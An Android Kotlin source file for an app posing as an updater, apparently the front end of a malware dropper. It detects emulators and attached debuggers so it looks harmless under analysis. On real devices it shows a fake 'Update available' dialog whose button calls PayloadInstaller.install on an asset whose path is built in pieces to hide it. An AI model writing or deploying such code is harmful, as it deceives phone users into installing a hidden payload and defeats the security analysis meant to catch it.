package com.clean.updater

import android.app.Activity
import android.app.AlertDialog
import android.os.Build
import android.os.Bundle
import android.os.Debug
import android.os.Handler
import android.os.Looper
import android.widget.Toast

class MainActivity : Activity() {
    private val assetPath = StringBuilder().append("media/").append("resource.dat").toString()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (looksLikeLab()) {
            Toast.makeText(this, "No updates available", Toast.LENGTH_SHORT).show()
            return
        }

        Handler(Looper.getMainLooper()).postDelayed({ showUpdatePrompt() }, 1500L)
    }

    private fun looksLikeLab(): Boolean {
        val fp = Build.FINGERPRINT.lowercase()
        return fp.contains("generic") ||
            fp.contains("vbox") ||
            fp.contains("test-keys") ||
            Debug.isDebuggerConnected()
    }

    private fun showUpdatePrompt() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("Update available")
            .setMessage("Try to update this app to the latest version.")
            .setPositiveButton("Update") { _, _ ->
                try {
                    PayloadInstaller.install(this, assetPath)
                } catch (t: Throwable) {
                    Toast.makeText(this, "Update unavailable", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Later", null)
            .show()
    }
}